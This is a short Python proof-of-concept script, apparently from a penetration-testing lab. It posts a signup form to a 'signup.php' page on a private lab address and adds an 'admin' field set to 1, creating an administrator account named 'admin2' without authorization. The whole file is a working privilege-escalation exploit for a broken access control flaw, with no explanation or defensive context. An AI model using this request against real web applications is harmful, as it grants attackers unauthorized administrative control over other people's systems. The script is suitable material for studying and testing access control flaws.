import requests

url = "http://192.168.56.104/jabcd0cs/signup.php"

data = {"last_name":"Access","first_name":"Control","username":"admin2","phonenumber":"123 123123123","Email":"admin2@jabcd0cs.com","password":"enjoypentest","admin":"1","adduser":"Submit"}

response = requests.session()
response = response.post(url=url, data=data)

print(response.content)
